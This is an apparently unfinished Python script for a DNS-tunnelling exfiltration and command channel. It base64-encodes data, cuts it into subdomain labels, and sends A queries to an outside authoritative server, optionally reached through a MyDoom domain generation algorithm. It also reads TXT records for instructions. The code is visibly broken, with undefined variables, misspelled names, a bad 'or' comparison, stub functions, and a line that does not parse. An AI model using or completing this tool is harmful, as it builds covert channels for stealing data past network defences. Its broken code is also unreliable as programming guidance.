#!/usr/bin/env python3

import argparse
import base64
from sys import argv
import time

import dns.resolver
from dga import mydoom

# DOC:
# <Fucntion of ability>
##  - confirm the number of required request packets -> special subdomain 'mail'
##  - select both generated domain(DGA) and specific domain
##  - select the type of decode from [base32, base64, base85]
##  - specify the time of interval
##  - embed the message as subdomain
# <Scenario>
## 1. decide the target hostname
##   > choose dga or specific domain
## 2. confirm the number of required request packets
##   * your auth server calculates the number of it based on the size of message
## 3. request the TXT record -> with www
# <Mapping of subdomain>
## - 'mail' : calculate the number of required packets
##   * your auth server embeds the size and the number of packet in TXT RR
## - 'www'  : request the message in TXT RR

def dga():
    pass

def exfiltrate(msg:str, length:int=10) ->list:
    """
    - control the number of packets based of the response packet size
    - if the requested message packet, 
    """
    # if you decode the message, put on '=' in the end after comine the line
    encrypted = base64.b64encode(msg.encode()).decode().strip('=')
    decomposed_msg = [_encrypted[i: i+lentgh] for i in range(0, len(_encrypted), length)]
    return decompose_msg

def query(message:list, hostname:str, interval:int) ->list:
    """
    - deal with the number of requesting messages
    - send the query message to the auth server
    - handle RR based on the query message
    - 'A' means data exfiltration
    - 'TXT' means expanding the function
    """
    # Query the DNS request to the auth server
    if len(message) == 1:
        payload = [message + '.' + hostname]
        if message == 'mail' or 'www':
            try:
                dns.resolver.query(payload, 'A')
                # if it needs, use the below script
                # return str(answer).strip('>]').split(' ')[-1]
            except:
                pass
            return 0

        else:
            response = dns.resolver.query(payload, 'TXT')
            verification_line = [str(i).split('=') for i in response[:]\
                                if 'verification' in str(i)]
            return verification_line

    elif len(message) == 0:
        return 0
    else:
        payload = [msg + '.' + hostname for msg in message]
        for i in payload:
            try:
                dns.resolver.query(payload, 'A')
            except:
                continue
            time.sleep(interval)
        return 0


def decipher(answer: list) -> str:

    """
    - Gather the TXT query's domain authentication value
    - Extract the value of domain verification
    - Decode the strings when the string is decode by base64
    """

    subdomain = [str(i).split('=')[1] for i in answer]
    subdomain = [i.strip(DOMAIN) for i in answer]
    value = [base64.b64decode(i.decode()) for i in _subdomain]

    pass

def main(qname: str) -> str:
    answer = request(query)
    print(answer)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                    usage='communicate.py [-h] [-s(specify) <hostname>|-d(DGA)]'\
                          '[-t(decode_type) <base*>] [-i(interval {s}) <60>]',\
                    description='Get the value of domain verification')
    parser.add_argument('-s', '--specify', help='specify the target host', \
                        action='store_true')
    parser.add_argument('-d', '--dga', help='use domain genelation algrorithm', \
                        action='store_true')
    parser.add_argument('-t', '--decode_type', help='difine the type of decode', \
                        action='store_true')
    parser.add_argument('-i', '--interval', help='difine the interval time of \
                        request packet', action='store_true')
    parser.add_argument('-c', '--', help='define the messages into subdomain',\
                        action='store_true')


    args = parser.parse_args()
    if args.specify:
        domain = args.domain
        # call function
    if args.dga:
        # call DGA function
        pass
    if args.decode_type:
        decode = args.decode_type
    if args.interval:
        interval = args.interval
    if args.message:
         = args.message
